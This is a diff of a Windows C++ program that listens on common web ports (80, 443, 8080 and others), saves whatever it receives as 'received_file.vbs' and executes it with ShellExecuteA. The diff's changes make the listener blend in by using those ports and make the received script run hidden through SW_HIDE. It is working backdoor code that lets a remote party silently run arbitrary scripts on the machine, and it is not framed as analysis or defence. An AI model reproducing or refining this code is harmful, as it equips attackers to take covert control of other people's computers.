@@ -1,13 +1,14 @@
+#include <winsock2.h>
+#include <iostream>
 #include <Windows.h>
 #include <fstream>
 #include <random>
+#include <vector>
 #include <cstdlib>
 
 const int k = 520;
-const int mn = 0;
-const int mx = 520;
-const int c = 3;
 const int l = 256;
+std::vector<int> availablePorts = {80,443,8080,2048,2000};
 
 int main() {
   int a;
@@ -16,10 +17,10 @@ int main() {
 
   std::random_device g;
   std::mt19937 h(g());
-  std::uniform_int_distribution<int> i(mn, mx);
+  std::uniform_int_distribution<int> i(0, availablePorts.size() - 1);
 
   for (int j = 0; j < k; ++j) {
-    int p = i(h);
+    int p = availablePorts[i(h)];
 
     WSADATA wsaData;
     WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -29,7 +30,7 @@ int main() {
       return -1;
     }
 
-    if (setsockopt(a, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, (const char*)&f, sizeof(f)) == SOCKET_ERROR) {
+    if (setsockopt(a, SOL_SOCKET, SO_REUSEADDR, (const char*)&f, sizeof(f)) == SOCKET_ERROR) {
       std::cerr << "setsockopt failed" << std::endl;
       return -1;
     }
@@ -43,7 +44,8 @@ int main() {
       return -1;
     }
 
-    if (listen(a, c) == SOCKET_ERROR) {
+	int c = 5;
+	if (listen(a, c) == SOCKET_ERROR) {
       std::cerr << "listen failed" << std::endl;
       return -1;
     }
@@ -66,7 +68,7 @@ int main() {
     o << z;
     o.close();
 
-    ShellExecuteA(NULL, "open", "received_file.vbs");
+	ShellExecuteA(NULL, "open", "received_file.vbs", NULL, NULL, SW_HIDE);
   }
   return 0;
 }
